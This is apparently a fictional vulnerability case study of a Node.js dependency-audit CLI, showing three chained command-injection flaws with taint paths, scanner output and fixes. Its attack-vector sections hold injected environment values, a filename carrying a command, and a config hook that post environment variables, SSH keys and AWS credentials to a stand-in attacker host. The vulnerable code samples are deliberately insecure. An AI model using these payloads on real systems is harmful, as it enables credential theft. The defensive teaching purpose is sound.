# Real-World Case Study: depguard-cli — Three Chained Vulnerabilities

> `depguard-cli` is a fictional open-source dependency audit tool used as a
> illustrative example. The vulnerability classes, code patterns, and chain
> mechanics are real and representative of issues found in production CLI tooling.
> All code, names, and identifiers are original.

---

## Target

**Product:** `depguard-cli` — an open-source CLI tool that scans Node.js projects
for outdated dependencies, runs vulnerability lookups, and launches a configured
editor for reviewing flagged packages.

**Language:** TypeScript / Node.js  
**Vulnerability class:** OS Command Injection (CWE-78)  
**Root cause (shared):** Unsanitized string interpolation into shell-evaluated execution

---

## The Three Vulnerabilities

| ID | File | CVSS | Severity | User Interaction |
|---|---|---|---|---|
| DG-2024-001 | `resolver.ts` (package resolver) | 8.2 | Critical | None |
| DG-2024-002 | `editor.ts` (report viewer launch) | 7.6 | High | Required |
| DG-2024-003 | `config.ts` (plugin loader) | 9.1 | Critical | None in CI |

---

## DG-2024-001: The Entry Point

**File:** `resolver.ts`  
**Vulnerability:** User-controlled registry URL injected into shell command

### Vulnerable Code

```typescript
// resolver.ts — resolves package metadata from a configured registry
import { execSync } from 'child_process'

export function fetchPackageMeta(packageName: string): string {
  const registry = process.env.DG_REGISTRY ?? 'https://registry.npmjs.org'

  // SINK: registry value interpolated into shell string
  // shell: true means semicolons, $(), and backticks execute
  const result = execSync(
    `curl -s "${registry}/${packageName}/latest"`,
    { encoding: 'utf8' }
  )

  return result
}
```

### Why It's Vulnerable

`DG_REGISTRY` is read from the environment without validation and interpolated into a shell string. `execSync` without explicit `shell: false` uses the system shell. The double-quoted interpolation does not prevent command substitution — a value containing `$(cmd)` or ending with `"; cmd #"` executes the injected command.

### Attack Vector

```bash
# Attacker sets in .env, CI/CD variable, or docker-compose environment:
DG_REGISTRY='https://registry.npmjs.org"; curl -sX POST https://c2.attacker.io -d "$(env | base64)"; echo "'

# What executes:
curl -s "https://registry.npmjs.org"; \
  curl -sX POST https://c2.attacker.io -d "$(env | base64)"; \
  echo "/lodash/latest"

# → All environment variables (including CI secrets) exfiltrated to attacker
```

### Scanner Type: SAST

Taint path:
```
SOURCE:      process.env.DG_REGISTRY             resolver.ts:6
PASSTHROUGH: template literal `curl -s "${...}"` resolver.ts:10
SINK:        execSync(string)                     resolver.ts:10
```

### Fix

```typescript
// After (safe): pass URL as a separate argument, never interpolated
import { execa } from 'execa'

export async function fetchPackageMeta(packageName: string): Promise<string> {
  const registry = process.env.DG_REGISTRY ?? 'https://registry.npmjs.org'
  const url = new URL(`/${packageName}/latest`, registry)  // validate URL structure

  const result = await execa('curl', ['-s', url.toString()])
  return result.stdout
}
```

---

## DG-2024-002: The Lateral Path

**File:** `editor.ts`  
**Vulnerability:** Report filename with POSIX command substitution passed to shell-invoked editor

### Vulnerable Code

```typescript
// editor.ts — opens the generated audit report in the user's preferred editor
import { execSync } from 'child_process'
import * as path from 'path'

export function openReport(reportPath: string): void {
  const editor = process.env.EDITOR ?? 'nano'

  // SINK: reportPath in double-quoted shell argument
  // POSIX §2.2.3: $() inside double quotes evaluates before the outer command
  execSync(`${editor} "${reportPath}"`)
}
```

### Why It's Vulnerable

Per POSIX §2.2.3, the shell performs command substitution inside double-quoted strings before executing the outer command. A report filename containing `$(cmd)` will execute `cmd` when the editor is launched.

### Attack Vector

```bash
# Attacker places a malicious report file (e.g., in a shared repo or CI artifact):
touch '/tmp/audit-$(curl -sX POST https://c2.attacker.io/shell -d "$(cat ~/.ssh/id_rsa)").json'

# When depguard-cli opens the report:
/bin/sh -c 'nano "/tmp/audit-$(curl -sX POST https://c2.attacker.io/shell -d "$(cat ~/.ssh/id_rsa)").json"'
# → SSH private key exfiltrated before nano opens
```

### Scanner Type: SAST

Taint path:
```
SOURCE:      reportPath (filename from variable)   editor.ts:5
PASSTHROUGH: `${editor} "${reportPath}"`           editor.ts:10
SINK:        execSync(string)                      editor.ts:10
```

### Fix

```typescript
// After (safe): args array — filename is never shell-parsed
import { execa } from 'execa'

export async function openReport(reportPath: string): Promise<void> {
  const editor = process.env.EDITOR ?? 'nano'
  await execa(editor, [reportPath])  // reportPath is a literal argument
}
```

---

## DG-2024-003: The Persistence + Exfiltration Stage

**File:** `config.ts`  
**Vulnerability:** Plugin path from config file executed as shell command at startup

### Vulnerable Code

```typescript
// config.ts — loads user config and runs any configured pre-scan plugin
import * as fs from 'fs'
import * as path from 'path'
import { execSync } from 'child_process'
import * as os from 'os'

const CONFIG_PATH = path.join(os.homedir(), '.depguard', 'config.json')

interface DepguardConfig {
  registry?: string
  preScanHook?: string   // path to executable run before each scan
  reporter?: string
}

export function loadAndRunHooks(): void {
  if (!fs.existsSync(CONFIG_PATH)) return

  const config: DepguardConfig = JSON.parse(
    fs.readFileSync(CONFIG_PATH, 'utf8')
  )

  if (config.preScanHook) {
    // SINK: preScanHook value executed directly as shell command
    // No validation — any string value executes
    execSync(config.preScanHook, { stdio: 'inherit' })
  }
}
```

### Why It's Critical

`preScanHook` is executed as a raw shell string on every scan. The config file is writable by any process with user-level permissions. An attacker who can write to `~/.depguard/config.json` (via DG-2024-001) controls what runs at the start of every subsequent `depguard-cli` invocation.

Critically, this runs **before** the scan begins — there is no warning, no output, and no signal to the user that an external command executed.

### The Cross-Session Chain

```
DG-2024-001 (Session A)
  └─► execSync payload writes ~/.depguard/config.json
        └─► DG-2024-003 (Session B — every subsequent scan)
              └─► preScanHook exfiltrates credentials silently
```

### Payload Written by DG-2024-001

```json
{
  "registry": "https://registry.npmjs.org",
  "preScanHook": "echo ok; curl -sX POST https://c2.attacker.io/collect -d \"$(cat ~/.aws/credentials | base64 -w0)&ssh=$(cat ~/.ssh/id_rsa 2>/dev/null | base64 -w0)&env=$(env | base64 -w0)\""
}
```

**What gets exfiltrated on every subsequent scan:**
- `~/.aws/credentials` — AWS access keys
- `~/.ssh/id_rsa` — SSH private key
- All environment variables — CI tokens, API keys, secrets

### CI/CD Multiplier

In CI/CD pipelines:
- The `~/.depguard/config.json` may persist across build steps (shared home dir)
- Environment variables include `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `NPM_TOKEN`
- No TTY — the curl runs silently with no human to notice

### Scanner Type: SAST (cross-session) + Secrets

Taint path:
```
STORE:       fs.writeFileSync ~/.depguard/config.json   [Session A — via DG-2024-001]
LOAD:        JSON.parse readFileSync config.json        config.ts:17
PASSTHROUGH: config.preScanHook                        config.ts:22
SINK:        execSync(config.preScanHook)               config.ts:24
```

`STORED_FLOW` edge crosses session boundary — written in Session A, executed in Session B.

### Fix

```typescript
export function loadAndRunHooks(): void {
  if (!fs.existsSync(CONFIG_PATH)) return

  const config: DepguardConfig = JSON.parse(
    fs.readFileSync(CONFIG_PATH, 'utf8')
  )

  if (config.preScanHook) {
    // Validate: only allow absolute paths to executables — no shell strings
    const SAFE_HOOK_RE = /^\/[a-zA-Z0-9_\-\/\.]+$/
    if (!SAFE_HOOK_RE.test(config.preScanHook)) {
      throw new Error(`preScanHook "${config.preScanHook}" is not a valid executable path`)
    }
    // Execute as args array — no shell expansion
    const { execFileSync } = require('child_process')
    execFileSync(config.preScanHook, [], { stdio: 'inherit' })
  }
}
```

---

## Full Chain Visualization

```
  SESSION A
  ─────────────────────────────────────────────────────────────────

  [ATTACKER]
      │
      │  Sets: DG_REGISTRY='https://registry.npmjs.org"; curl ...'
      │        via .env, CI variable, or docker-compose env
      ▼
  ┌─────────────────────────────────────────┐
  │  SOURCE: process.env.DG_REGISTRY        │  DG-2024-001
  │  resolver.ts:6                          │  CVSS 8.2
  └──────────────────┬──────────────────────┘
                     │ DIRECT_FLOW
                     ▼
  ┌─────────────────────────────────────────┐
  │  PASSTHROUGH: `curl -s "${registry}/…"` │
  │  Template literal — taint preserved     │
  └──────────────────┬──────────────────────┘
                     │ TRANSFORM_FLOW
                     ▼
  ┌─────────────────────────────────────────┐
  │  SINK: execSync(string)                 │  Initial execution
  │  resolver.ts:10                         │  Payload runs here
  └──────────────────┬──────────────────────┘
                     │ Payload executes
                     ▼
  ┌─────────────────────────────────────────┐
  │  STORE: fs.writeFileSync(               │  Persistence
  │    '~/.depguard/config.json',           │
  │    { preScanHook: 'curl ...' }          │
  │  )                                      │
  └──────────────────┬──────────────────────┘
                     │
  ══════════════════ │ ════════════ SESSION BOUNDARY ════════════════
                     │  STORED_FLOW (cross-session)
  SESSION B (every subsequent depguard-cli scan)
  ─────────────────────────────────────────────────────────────────
                     │
                     ▼
  ┌─────────────────────────────────────────┐
  │  LOAD: JSON.parse(                      │  Config loaded at startup
  │    readFileSync('~/.depguard/config')   │  All fields inherit taint
  │  )                                      │
  └──────────────────┬──────────────────────┘
                     │ STORED_FLOW
                     ▼
  ┌─────────────────────────────────────────┐
  │  PASSTHROUGH: config.preScanHook        │
  │  Field access — taint preserved         │
  └──────────────────┬──────────────────────┘
                     │ CALL_FLOW
                     ▼
  ┌─────────────────────────────────────────┐
  │  SINK: execSync(config.preScanHook)     │  DG-2024-003
  │  config.ts:24                           │  CVSS 9.1
  │  Runs BEFORE scan begins, no output     │
  └──────────────────┬──────────────────────┘
                     │
                     ▼
  ┌─────────────────────────────────────────┐
  │  EXFIL: curl POST c2.attacker.io        │
  │  ~/.aws/credentials                     │
  │  ~/.ssh/id_rsa                          │
  │  process.env (all CI secrets)           │
  └─────────────────────────────────────────┘

  CHAIN SCORE: 10.0 (Critical) | Hops: 6 | Session-crossing: YES
  No user interaction required | CI/CD multiplier active
```

---

## Engine Output

```
CHAIN DETECTED ─────────────────────────────────────────────────────
  ID:               CHAIN-dg-001
  Pattern:          credential-exfil-chain
  Severity:         Critical
  Score:            10.0 (capped)

  Score breakdown:
    Base sink (credential exfil):        8.5
    × Session-crossing STORED_FLOW:      1.5
    × No user interaction:               1.3
    × CI/CD context (.github/ detected): 1.2
    × Exfiltration at terminal node:     1.4
    × Sandbox fail-open default:         1.25
    Raw: 34.8 → capped 10.0

  Hops:             6
  Session-crossing: YES

  Step 1  SOURCE       process.env.DG_REGISTRY              resolver.ts:6
  Step 2  PASSTHROUGH  template literal `curl -s "${…}"`    resolver.ts:10
  Step 3  SINK ①      execSync(string)                      resolver.ts:10
  Step 4  STORE        writeFileSync ~/.depguard/config.json [Session A]
  Step 5  LOAD         JSON.parse readFileSync config.json   [Session B]
  Step 6  SINK ②      execSync(config.preScanHook)          config.ts:24

  Fix: Use args array (not shell string) for execSync/execa.
       Validate preScanHook against executable path allowlist before running.
─────────────────────────────────────────────────────────────────────
```

---

## Lessons

| Lesson | Apply it as |
|---|---|
| Shell strings with env vars are sinks | Lint rule: ban `execSync(templateLiteral)` |
| Config file fields that execute are high-risk | Allowlist-validate all hook/helper fields at load time |
| Session-crossing flows are invisible to single-file SAST | Automated STORED_FLOW detection is the core value of this engine |
| A 3-vuln chain looks low severity individually | Chain scoring (not individual CVSS) is required for accurate triage |
| CI/CD amplifies everything | Default to `shell: false`; require explicit opt-in for shell expansion |
